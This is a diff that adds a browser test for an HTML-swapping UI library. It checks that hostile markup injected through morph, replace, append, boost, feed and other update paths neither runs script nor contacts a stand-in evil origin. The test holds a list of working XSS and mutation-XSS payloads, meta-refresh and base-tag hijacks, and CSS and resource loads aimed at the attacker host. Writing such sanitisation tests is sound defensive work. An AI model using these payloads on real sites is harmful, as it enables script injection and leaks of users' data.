@@ -479,6 +479,73 @@ for (const [engine, launcher] of [["chromium", chromium], ["firefox", firefox]])
       await context.close();
     });
 
+    const E = () => f.evilOrigin;
+    const payloads = () => ({
+      "inline script": `<script>document.documentElement.setAttribute("data-pwned","inline")</script>`,
+      "same-origin script": `<script src="/attacker.js"></script>`,
+      "off-origin script": `<script src="${E()}/x.js"></script>`,
+      "img onerror": `<img src="/none.png" onerror="document.documentElement.setAttribute('data-pwned','onerror')">`,
+      "svg onload": `<svg onload="document.documentElement.setAttribute('data-pwned','svg')"></svg>`,
+      "meta refresh": `<meta http-equiv="refresh" content="0;url=${E()}/meta">`,
+      "meta refresh nested": `<section><div><meta http-equiv="refresh" content="0;url=${E()}/meta2"></div></section>`,
+      "base": `<base href="${E()}/"><a id="rel" href="relative">x</a>`,
+      "iframe srcdoc": `<iframe srcdoc="<script>parent.document.documentElement.setAttribute('data-pwned','srcdoc')</script>"></iframe>`,
+      "iframe": `<iframe src="${E()}/frame"></iframe>`,
+      "object and embed": `<object data="${E()}/object"></object><embed src="${E()}/embed">`,
+      "style exfil": `<style>@import url(${E()}/css);body{background:url(${E()}/bg)}</style><link rel="stylesheet" href="${E()}/link.css">`,
+      "img": `<img src="${E()}/img">`,
+      "style attribute": `<span id="styled" style="color:rgb(1,2,3);background:url(${E()}/styleattr)">x</span>`,
+      "link prefetch": `<link rel="prefetch" href="${E()}/prefetch"><link rel="preload" as="fetch" href="${E()}/preload">`,
+      "mxss math": `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=document.documentElement.setAttribute('data-pwned','mxss')&gt;"></table></mtext></math>`,
+      "mxss svg": `<svg></p><style><a id="</style><img src=1 onerror=document.documentElement.setAttribute('data-pwned','mxss2')>"></svg>`,
+      "template": `<template><script>document.documentElement.setAttribute("data-pwned","template")</script><img src="${E()}/tpl"></template>`,
+      "declarative shadow": `<div><template shadowrootmode="open"><img src="${E()}/dsd"></template></div>`,
+      "autofocus": `<input autofocus onfocus="document.documentElement.setAttribute('data-pwned','autofocus')">`,
+      "video": `<video poster="${E()}/poster" src="${E()}/video"></video>`,
+    });
+
+    for (const via of ["morph", "replace", "append", "prepend", "boost", "region", "feed", "page answer"]) {
+      test(`hostile markup by ${via} runs nothing and leaves nothing (${engine})`, { timeout: 120000 }, async () => {
+        for (const [label, markup] of Object.entries(payloads())) {
+          f.evil.length = 0;
+          const name = key("html");
+          const wrapped = `<div id="t">${markup}</div>`;
+          const start = `<div id="t">start</div><div id="r" data-ui-src="/${name}-frag"></div><div id="fd" data-ui-src="/${name}-feed" data-ui-feed="into" data-ui-after="0"><div id="into"></div></div><form id="f" data-ui-form method="post" action="/${name}-post"><button id="go">go</button></form><a id="next" href="/${name}-page">next</a>`;
+          route(`/${name}`, doc(start));
+          route(`/${name}-page`, doc(wrapped));
+          route(`/${name}-frag`, doc(`<div id="r">${markup}</div>`));
+          route(`/${name}-feed`, markup);
+          f.routes.set(`/${name}-post`, (req, res) => {
+            if (via === "region") return f.ops(res, { ops: [{ op: "invalidate", target: "r" }] });
+            if (via === "feed") return f.ops(res, { ops: [{ op: "invalidate", target: "fd" }] });
+            if (via === "page answer") return f.html(res, doc(wrapped));
+            f.ops(res, { ops: [{ op: via, target: "t", html: via === "morph" || via === "replace" ? wrapped : markup }] });
+          });
+          const { context, page } = await fresh(`/${name}`);
+          await page.click(via === "boost" ? "#next" : "#go");
+          await sleep(350);
+          const url = page.url();
+          assert.ok(url.startsWith(f.origin), `${label}: left the origin for ${url}`);
+          const state = await page.evaluate(() => ({
+            pwned: document.documentElement.getAttribute("data-pwned"),
+            attacker: document.documentElement.getAttribute("data-attacker-ran"),
+            base: document.baseURI,
+            rel: document.getElementById("rel")?.href,
+            styled: document.getElementById("styled") ? getComputedStyle(document.getElementById("styled")).color : null,
+            leftovers: document.querySelectorAll("meta[http-equiv],base").length,
+          }));
+          assert.equal(state.pwned, null, label);
+          assert.equal(state.attacker, null, label);
+          assert.ok(state.base.startsWith(f.origin), `${label}: base ${state.base}`);
+          if (state.rel) assert.ok(state.rel.startsWith(f.origin), `${label}: link ${state.rel}`);
+          assert.notEqual(state.styled, "rgb(1, 2, 3)", label);
+          assert.equal(state.leftovers, 0, label);
+          assert.deepEqual(f.evil.map((hit) => hit.url), [], label);
+          await context.close();
+        }
+      });
+    }
+
     test(`named elements can't switch the runtime off (${engine})`, async () => {
       for (const name of ["cookie", "getElementById", "querySelector", "querySelectorAll", "body", "head", "documentElement", "activeElement", "title", "createElement", "addEventListener"]) {
         const path = key("document");
